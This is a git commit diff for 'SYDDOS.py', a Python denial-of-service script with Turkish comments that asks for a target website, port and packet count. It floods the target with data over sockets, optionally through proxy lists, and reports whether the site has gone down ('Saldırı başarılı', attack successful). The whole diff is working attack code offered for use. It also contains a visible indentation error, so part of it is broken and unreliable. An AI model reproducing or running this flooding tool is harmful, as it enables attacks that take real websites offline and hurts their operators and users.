e34fdc7ae39664dadb6c3cd38303b0eee3b776b4
TheSyrox <80204080+TheSyrox@users.noreply.github.com>
2023-01-20 11:45:29 +0300

    Update SYDDOS.py

--- SYDDOS.py
+++ SYDDOS.py
@@ -2,24 +2,12 @@ import socket
 import time
 import requests
 
-def send_packets(host, port, packet_count, proxy_list):
-    for proxy in proxy_list:
-        # Proxy'nin canlı olup olmadığını kontrol et
-        try:
-            response = requests.get("http://" + proxy, timeout=5)
-            if response.status_code != 200:
-                print(proxy + " KAPALI")
-                continue
-        except:
-            print(proxy + " KAPALI")
-            continue
-
+def send_packets(host, port, packet_count, proxy_list=None):
+    if proxy_list is None:
         # Socket oluştur
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
-        # Proxy kullanmak için bağlantı yap
         s.settimeout(10)
-        s.connect((proxy, port))
+        s.connect((host, port))
         
         # Paketleri gönder
         start_time = time.time()
@@ -31,6 +19,35 @@ def send_packets(host, port, packet_count, proxy_list):
         # Bağlantıyı kapat
         s.close()
         print("Gönderme hızı: ", packet_count/sending_time, " paket/s")
+    else:
+        for proxy in proxy_list:
+            # Proxy'nin canlı olup olmadığını kontrol et
+            try:
+                response = requests.get("http://" + proxy, timeout=5)
+                if response.status_code != 200:
+                    print(proxy + " KAPALI")
+                    continue
+            except:
+                print(proxy + " KAPALI")
+                continue
+
+            # Socket oluştur
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            # Proxy kullanmak için bağlantı yap
+            s.settimeout(10)
+            s.connect((proxy, port))
+
+            # Paketleri gönder
+            start_time = time.time()
+            data = b'PAKET'* packet_count
+            s.sendall(data)
+            end_time = time.time()
+            sending_time = end_time - start_time
+
+            # Bağlantıyı kapat
+            s.close()
+            print("Gönderme hızı: ", packet_count/sending_time, " paket/s")
     try:
         response = requests.get(host)
         if response.status_code == 200:
@@ -42,7 +59,7 @@ def send_packets(host, port, packet_count, proxy_list):
                 print("Saldırı iptal edildi")
         else:
             print("Site kapandı")
-    except:
+       except:
         print("Siteye ulaşılamadı")
 
 host = input("Hedef website adresi: ")
@@ -55,12 +72,8 @@ if proxy_source.lower() == 'yes':
     with open(proxy_file, 'r') as f:
         proxy_list = f.read().splitlines()
 else:
-    # Proxy listesini al
-    try:
-        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
-        proxy_list = response.text.split('\r\n')
-    except:
-        print("Proxy listesi alınamadı")
+    proxy_list = None
 
 send_packets(host, port, packet_count, proxy_list)
 print("Saldırı başarılı")
+
